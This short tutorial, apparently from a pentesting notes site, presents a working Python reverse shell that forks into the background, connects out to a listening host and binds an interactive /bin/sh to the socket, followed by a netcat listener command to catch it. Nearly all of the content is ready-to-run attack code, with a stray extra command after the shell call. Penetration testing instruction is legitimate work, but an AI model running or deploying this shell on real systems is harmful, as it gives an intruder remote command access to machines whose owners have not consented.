---
title: Reverse Shell with Socket
tags: ['Python','Reverse Shell' ]
---

A reverse shell is an action by which a user gains access to the shell of an external server. For example, if you are working in a post-exploitation pentesting phase and would like to create a script that is invoked in certain scenarios that will automatically get a shell to access the filesystem of another machine, we could build our own reverse shell in Python.

### Step 1: Set Up the Server

```python title="reverse_shell_python.py"
import socket
import subprocess
import os
socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')
socket_handler.connect(("127.0.0.1", 45679))
os.dup2(socket_handler.fileno(),0)
os.dup2(socket_handler.fileno(),1)
os.dup2(socket_handler.fileno(),2)
shell_remote = subprocess.call(["/bin/sh", "-i"])
list_files = subprocess.call(["/bin/ls", "-i"])
```

### Step 2: Test the Reverse Shell

```bash
$ nc -lvp 45679
```

```bash
ls
```

